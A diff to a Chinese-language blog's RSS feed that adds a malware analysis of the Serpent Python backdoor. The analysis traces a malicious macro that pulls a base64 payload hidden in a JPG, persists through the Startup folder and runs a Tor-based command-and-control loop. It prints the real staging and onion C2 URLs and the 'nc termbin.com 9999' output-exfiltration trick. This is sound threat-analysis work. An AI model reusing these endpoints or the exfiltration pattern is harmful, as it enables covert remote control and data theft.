@@ -5,8 +5,98 @@
 		<description>Recent content in Mediums on alee</description>
 		<generator>Hugo -- gohugo.io</generator>
 		<language>zh-cn</language>
-		<lastBuildDate>Mon, 28 Mar 2022 13:59:05 +0800</lastBuildDate>
+		<lastBuildDate>Tue, 17 May 2022 15:41:15 +0800</lastBuildDate>
 		<atom:link href="https://www.a1ee.cn/medium/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Serpent</title>
+			<link>https://www.a1ee.cn/medium/serpent/</link>
+			<pubDate>Tue, 17 May 2022 15:41:15 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/medium/serpent/</guid>
+			<description>Serpent 样本分析 样本信息 Serpent是一个用Python编写的后门，用于攻击法国建筑、房地产和政府行业的实体。 IOC 类别 特征值 SHA256 8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19 SHA1 2d6f1ed1236727b36a92dd44cd987c36d6fb7e35 MD5 321e04294c04db10d5dbf05051e540e2 样本分析 样</description>
+			<content type="html"><![CDATA[<h1 id="serpent-样本分析">Serpent 样本分析</h1>
+<h2 id="样本信息">样本信息</h2>
+<p><code>Serpent</code>是一个用<code>Python</code>编写的后门，用于攻击法国建筑、房地产和政府行业的实体。</p>
+<p><strong>IOC</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类别</th>
+<th style="text-align:left">特征值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">SHA256</td>
+<td style="text-align:left">8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA1</td>
+<td style="text-align:left">2d6f1ed1236727b36a92dd44cd987c36d6fb7e35</td>
+</tr>
+<tr>
+<td style="text-align:left">MD5</td>
+<td style="text-align:left">321e04294c04db10d5dbf05051e540e2</td>
+</tr>
+</tbody>
+</table>
+<h2 id="样本分析">样本分析</h2>
+<h3 id="样本信息-1">样本信息</h3>
+<p>本次分析的是一个<code>docm</code>文档，其中包含了恶意宏病毒：</p>
+<p><img src="/serpent_images/63741711238983.png" alt=""></p>
+<h3 id="恶意宏分析">恶意宏分析</h3>
+<p>通过查看，执行宏后会首先对以下两个网站进行访问：</p>
+<pre tabindex="0"><code>https://www.fhccu.com/images/ship3.jpg
+http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html
+</code></pre><p><img src="/serpent_images/260481311220557.png" alt=""></p>
+<p>将<code>https://www.fhccu.com/images/ship3.jpg</code>文件流保存到本地<code>c:\users\public\pic.jpg</code></p>
+<p><img src="/serpent_images/22242211226850.png" alt=""></p>
+<p>将<code>c:\users\public\pic.jpg</code>内容部分提取到<code>c:\users\public\picb64.txt</code>中</p>
+<p><img src="/serpent_images/414942817247016.png" alt=""></p>
+<p>通过<code>base64</code>解码<code>c:\users\public\picb64.txt</code>，将内容写入到新文件<code>%USERPROFILE%\desktop\Microsoft_Office_Word_Update-20220201-fr.bat</code>中，并执行：</p>
+<p><img src="/serpent_images/90295917239685.png" alt=""></p>
+<h3 id="执行代码获取流程分析">执行代码获取流程分析</h3>
+<p>在图片<code>pic.jpg</code>的末尾处，可以提取出<code>picb64.txt</code>的内容：</p>
+<p><img src="/serpent_images/147090218236240.png" alt=""></p>
+<p>将提取的字符串通过<code>base64</code>解码，获取了<code>.bat</code>的内容：</p>
+<p><img src="/serpent_images/566850318231994.png" alt=""></p>
+<h3 id="powershell-命令分析">powershell 命令分析</h3>
+<p>从<code>bat</code>脚本中的执行命令可以看出，其中包含了两段关键指令：恶意脚本下载、完成后连接请求</p>
+<p><img src="/serpent_images/327500809220558.png" alt=""></p>
+<p>恶意脚本下载部分由三个步骤实现：安装执行环境、本地化恶意脚本、持久化恶意脚本</p>
+<p>安装执行环境时，首先下载<code>chocolatey</code>，再由<code>chocolatey</code>安装<code>python3</code>，最后<code>pip</code>安装必要运行库<code>requests</code>、<code>pysocks</code>：</p>
+<p><img src="/serpent_images/258302709226851.png" alt=""></p>
+<p>本地化恶意脚本，则是从<code>https://www.fhccu.com/images/7.jpg</code>下载恶意脚本，进行<code>base64</code>解码，保存到<code>%userprofile%\searches\MicrosoftSecurityUpdate.py</code>中：</p>
+<p><img src="/serpent_images/340212909247017.png" alt=""></p>
+<p>持久化恶意脚本，则是将启动命令保存到<code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftSecurityUpdate.bat</code>中，达到开机自启动的效果：</p>
+<p><img src="/serpent_images/171903109239686.png" alt=""></p>
+<p>当一切执行完毕后，将请求一次<code>http://shorturl.at/qzES8</code>。</p>
+<h3 id="恶意脚本分析">恶意脚本分析</h3>
+<p>首先将<code>https://www.fhccu.com/images/7.jpg</code>下载到本地，可以看到其中包含了一段<code>base64</code>编码的数据：</p>
+<p><img src="/serpent_images/276434309236241.png" alt=""></p>
+<p>将内容提取出来，并进行解码：</p>
+<p><img src="/serpent_images/215164409231995.png" alt=""></p>
+<p>好家伙，套娃开始了，再解一次获得了<code>Serpent</code>的脚本代码：</p>
+<p><img src="/serpent_images/599164509249875.png" alt=""></p>
+<p>从主循环开始看起，执行后首先休眠，然后尝试调用<code>get_cmd</code>函数，将返回值作为输入参数再调用<code>run_cmd</code>函数：</p>
+<p><img src="/serpent_images/218525509247479.png" alt=""></p>
+<p>整体设计逻辑很简单，一个作为命令输入，一个作为命令执行，在函数顶端，分别指定了两个<code>tor</code>链接，一个是用于命令输入的，另一个适用于执行结果获取的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cmd_url_order</span> <span class="o">=</span> <span class="s1">&#39;http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">cmd_url_answer</span> <span class="o">=</span> <span class="s1">&#39;http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html&#39;</span>
+</span></span></code></pre></div><p><img src="/serpent_images/177600311226222.png" alt=""></p>
+<p>作者在设计命令执行及结果获取时，采用了一种巧妙的办法，利用<code>subprocess.Popen</code>执行命令，<code>stdout</code>获取执行结果，再将执行结果发送到<code>termbin.com</code>，把返回链接添加到<code>headers</code>标签，发送到<code>http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html</code>：</p>
+<p><img src="/serpent_images/110160411248662.png" alt=""></p>
+<p>为什么很巧妙，这里就要介绍一下<a href="https://termbin.com/">termbin</a>了，这是一个将文本转换为<code>url</code>的网站，你可以通过在终端上敲击<code>echo just testing!  | nc termbin.com 9999</code>命令，将<code>just testing!</code>保存到<code>termbin.com</code>站点上，而命令敲击后，将会返回一条链接，访问该链接即可获取文本字符串信息，作者正是使用了这种方式，不通过交互式对话直接来获取命令执行结果，逃避流量监测：</p>
+<pre tabindex="0"><code>[user@localhost: ~]$ echo just testing! | nc termbin.com 9999
+http://termbin.com/ktkf
+[user@localhost: ~]$ curl http://termbin.com/ktkf
+just testing!
+</code></pre><h2 id="参考资料">参考资料</h2>
+<p><a href="https://blogs.vmware.com/security/2022/04/serpent-the-backdoor-that-hides-in-plain-sight.html">https://blogs.vmware.com/security/2022/04/serpent-the-backdoor-that-hides-in-plain-sight.html</a>
+<a href="https://app.any.run/tasks/2788c24d-24f8-4b7c-8b50-69ca6ea41407/">https://app.any.run/tasks/2788c24d-24f8-4b7c-8b50-69ca6ea41407/</a></p>
+]]></content>
+		</item>
 		
 		<item>
 			<title>Retefe</title>
